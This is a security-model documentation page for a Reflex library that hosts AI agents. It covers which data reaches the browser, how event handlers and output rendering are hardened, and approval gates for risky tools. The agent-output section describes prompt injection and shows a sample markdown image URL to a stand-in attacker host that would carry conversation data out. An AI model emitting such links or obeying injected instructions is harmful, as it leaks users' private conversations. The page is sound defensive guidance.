# Security model

Reflex keeps each browser session's state on the server and sends the **state vars** to
the browser as JSON. That is the line this page is about: what is a state var reaches the
browser; everything else stays on the server.

## What reaches the browser

| Data | Where it lives | Reaches the browser? |
|---|---|---|
| Model provider API keys | Environment variables, read by the agent framework | **No** |
| `HttpAGUIClient` headers (tokens) | The client object, a `ClassVar` or the `create_client()` result | **No.** Never logged, never in errors. |
| Agent and client objects | `ClassVar`s and backend memory | **No** |
| Encrypted reasoning values | The backend-only conversation (`_conv`) | **No** |
| Messages, tool arguments and results, shared state | Public state vars | **Yes, by design.** The user sees their own conversation. |

Rules that keep it that way:

- Configuration is class-level and annotated `ClassVar`. `AgentState` refuses a class
  whose `agent` (or any other setting) is not, because Reflex would make it a state var.
- Never put a secret in a state var of your own. Backend-only vars (names starting with
  `_`) and `ClassVar`s stay on the server.
- Logs above DEBUG never contain message content, tool arguments, results or headers. At
  DEBUG, content may appear (for example, the first 1 KiB of an HTTP error body), so do
  not enable DEBUG logging in production if the agent handles sensitive data.
- No telemetry: the library makes no network calls except to the agent endpoints you
  configure.

## What the browser can do

Every public `AgentState` event handler can be called from the browser, by anyone with
the page open, with any arguments. The library assumes they will be:

| Attempt | Result |
|---|---|
| Call a handler at the wrong time (approve when nothing waits, send while running) | No-op |
| Pass wrong argument types | No-op |
| Send oversized input | Messages over `max_message_length` (32,000 characters) are refused; edited arguments, interrupt answers, rejection reasons and shared-state writes over 64 KiB are refused; JSON Patches are limited to 256 operations, with the size checked after each one |
| Trigger the run streamer (`drive_run`) directly | No-op unless a handler just scheduled a run |
| Act on another user's tool call | Impossible: state is per session, and call IDs are looked up in that session only |
| Call a hook (`create_client`, `on_run_end`, …) | Impossible: the hooks, and your overrides of them, are not event handlers |
| Point the app at another agent URL | Impossible: the URL is developer configuration, never taken from the browser |

Your own event handlers follow the same rule: validate their arguments, and keep helper
methods private (a leading `_`), because Reflex makes every public state method callable
from the browser.

## Agent output

The agent's output is untrusted text.

- Markdown is rendered **without raw HTML**: `<script>` or `<img onerror>` in a reply stays
  text. Tool arguments and results are shown as text.
- Links with `javascript:` URLs are neutralized by the Markdown renderer.
- **Images in Markdown load from wherever the model points.** A prompt injection (for
  example, in a web page a tool fetched) could make the model write
  `![](https://attacker.example/?q=<conversation data>)`, and the browser would request
  that URL. If your agent reads untrusted content and handles sensitive data, keep it from
  emitting such images (instructions, output filtering), or render messages with your own
  component instead of `message_list`.

## Dangerous tools

Prompt injection can also make the model call a tool it should not. Mark tools with side
effects `requires_approval=True` (PydanticAI, client tools) or guard them with
`request_tool_approval` (LangGraph): the user sees the arguments, can edit them, and must
approve before the tool runs. `retry_run` can run backend tools again, so make tools with
external effects idempotent or approval-gated.

## The agent endpoint

With `HttpAGUIClient`, the agent server is trusted infrastructure. Every event is
validated, a stalled stream times out, and cancelling closes the connection, but the app
does not limit the size of what the agent streams. Keep the endpoint private or
authenticated ([Sidecar deployment](guides/sidecar.md)).
